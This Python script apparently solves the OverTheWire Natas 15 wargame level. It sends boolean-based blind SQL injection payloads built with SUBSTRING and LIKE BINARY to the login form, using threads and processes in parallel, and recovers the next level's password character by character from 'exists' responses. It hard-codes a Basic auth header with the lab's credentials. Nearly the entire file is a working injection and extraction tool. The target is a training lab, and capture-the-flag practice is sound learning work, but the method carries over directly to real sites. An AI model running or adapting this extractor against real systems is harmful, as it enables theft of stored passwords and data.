#!/usr/bin/env python3
import requests as req
from requests.auth import HTTPBasicAuth
import re
import sys
from colorama import Fore, Back
import concurrent.futures
import multiprocessing
import time
inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
list = [element for element in inputs]
password = ["*" for _ in range(32)]
headers = {
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"

r = 0


def make_request(params):
    global headers
    global url
    global password
    global r
    r = r+1
    payload = 'natas16\" and SUBSTRING(password, ' + \
        str(params["x"]) + ', 1) LIKE BINARY \"%' + params["i"] + '%\"#'

    data = {
        "username": payload
    }
    try:
        res = req.post(url, headers=headers, data=data, timeout=5)
    except req.exceptions.Timeout:
        print(Fore.LIGHTRED_EX +
              "\n[!] Timeout Ocurred! , Continueing again" + Fore.WHITE)
        req.post(url, data=data, headers=headers)
    fancy = ["-", "\\", "|", "/", ]
    sys.stdout.write(
        Fore.LIGHTGREEN_EX + "["+fancy[ord(params["i"]) % 4]+"] " + str(r) + " -- " + params["i"] + "  ==> " + "".join(password) + Fore.GREEN + "\r" + Fore.WHITE)
    sys.stdout.flush()
    return {"res": res, "char": params["i"]}


def match_char(x):
    with concurrent.futures.ProcessPoolExecutor() as executor:
        temp_list = []
        for el in list:
            temp_list.append({"x": x, "i": el})
        results = executor.map(make_request, temp_list)
        pattern = re.compile(r'exists')
    for result in results:
        match = pattern.findall(result["res"].text)
        if(len(match) > 0):
            password[x-1] = result["char"]
            return result["char"]


def create_process():
    iterator = [i+1 for i in range(32)]
    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = executor.map(match_char, iterator)
        return results


t1 = time.perf_counter()
passcode = ""
results = create_process()
for result in results:

    if(result == None):
        break
    passcode = passcode+result
t2 = time.perf_counter()
print(f"\n[*] Brought the result in {round(t2-t1, 4)} seconds")
print(Fore.BLUE+"\n[!] Password = " + passcode + Fore.WHITE)
